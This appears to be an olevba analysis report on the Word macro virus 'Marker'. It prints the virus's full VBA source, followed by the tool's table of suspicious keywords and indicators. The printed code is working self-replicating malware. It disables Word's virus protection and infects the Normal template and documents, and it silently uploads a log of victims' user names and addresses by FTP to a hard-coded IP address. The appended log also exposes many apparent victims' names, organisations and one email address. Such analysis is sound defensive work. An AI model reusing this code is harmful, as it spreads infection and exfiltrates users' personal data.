olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-85f5c85e7d03ecccc7209a3e008d44222d34d0b4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-85f5c85e7d03ecccc7209a3e008d44222d34d0b4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Auto_Open()
Makro1

End Sub


Sub Makro1()
'
' Makro1 Makro
' Makro zapisane 99-11-17 przez ..
'
    Selection.TypeText Text:="Co chcesz zrobiæ ?"
End Sub


Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For I = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next I
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For I = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next I

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 10:42:25 AM - Wednesday, 23 Dec 1998
' BCBSA
'



' 02:25:08 PM - Wednesday, 23 Dec 1998
' BCBSA
'



' 01:28:09 PM - Tuesday, 5 Jan 1999
' BCBSA
'



' 06:56:46 PM - Monday, 11 Jan 1999
' Kay Helgerson
'



' 06:01:43 PM - Tuesday, 26 Jan 1999
' Ayenda M. Lambert
'



' 09:06:30 AM - Monday, 1 Feb 1999
' Dee Carr
'



' 11:49:14  - torsdag, 4 feb 1999
' Henrik Hansen
'



' 03:45:07  - mandag, 8 feb 1999
' JPW på PC2333
'



' 08:23:50  - onsdag, 10 feb 1999
' RHG på PC1439
'



' 11:27:32  - onsdag, 10 feb 1999
' CBB på PC0688
'



' 11:27:38  - torsdag, 11 feb 1999
' PLN på PC1723
'



' 03:13:28  - mandag, 15 feb 1999
' TRJ på PC2308
'



' 01:52:51  - pi¹tek, 19 II 1999
' Jacek Spychalski
' jacek.spychalski@centertel.pl



' 09:40:06  - czwartek, 11 mar 1999
' MF
'



' 11:46:49  - pi¹tek, 12 mar 1999
' OPTIMUS
'



' 03:09:16  - pi¹tek, 26 mar 1999
' Kwiatkowski
'



' 03:03:25 PM - œroda, 31 mar 1999
' Pracowik InfoViDE
'



' 02:46:18  - pi¹tek, 9 kwi 1999
' OPTIMUS
'



' 01:01:10  - pi¹tek, 16 kwi 1999
' Marciszewski
'



' 09:25:58  - poniedzia³ek, 19 kwi 1999
' PROKOM
'



' 11:27:44  - wtorek, 4 maj 1999
' Parfianowicz Maciej
'



' 02:48:49  - czwartek, 13 maj 1999
' CichoszW
'



' 08:07:48 AM - Friday, 14 May 1999
' PROKOM_LUBLIN
'



' 05:59:26  - czwartek, 27 maj 1999
' CichoszW
'



' 11:05:59  - pi¹tek, 28 maj 1999
' PROKOM
'



' 02:56:32  - poniedzia³ek, 31 maj 1999
' Grzegorz Skrzypkowski
'



' 10:50:49  - œroda, 2 cze 1999
' BrylaK
'



' 08:09:11  - poniedzia³ek, 7 cze 1999
' Grzegorz Skrzypkowski
'



' 07:51:36  - poniedzia³ek, 5 lip 1999
' moszynskij
'



' 07:56:31  - pi¹tek, 16 lip 1999
' PROKOM_KOSZALIN
'



' 09:54:58  - poniedzia³ek, 11 paŸ 1999
' Karol ¯urawski.
'



' 08:06:19  - œroda, 13 paŸ 1999
' Edward Zurawski
'



' 03:11:07  - niedziela, 24 paŸ 1999
' ..
'



' 07:26:05  - œroda, 17 XI 1999
' Marco
'



' 11:36:08  - âòîðíèê, 14 äåê 1999
' Administrator sieci LAN
'



' 09:47:20  - ÷åòâåðã, 27 ÿíâ 2000
' Administrator sieci LAN
'



' 08:54:22  - czwartek, 9 mar 2000
' Tomasz Rochewicz
'



' 05:25:21  - poniedzia³ek, 27 mar 2000
' Patryk Biela
'



' 03:39:25  - czwartek, 13 kwi 2000
' Polskie Radio
'



' 04:04:42  - wtorek, 20 cze 2000
' Polskie Radio
'



' 08:27:43  - czwartek, 28 wrz 2000
' Biuro
'



' 02:59:56  - pi¹tek, 20 paŸ 2000
' Elas
'



' 02:06:00  - poniedzia³ek, 30 paŸ 2000
' Elas
'



' 10:33:29 AM - Thursday, 5 Apr 2001
' gorecki
'



' 02:42:21 PM - Monday, 21 May 2001
' Ditry PC
'



' 03:40:07 Grunge - Monday, 21 May 2001
' Replication System
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

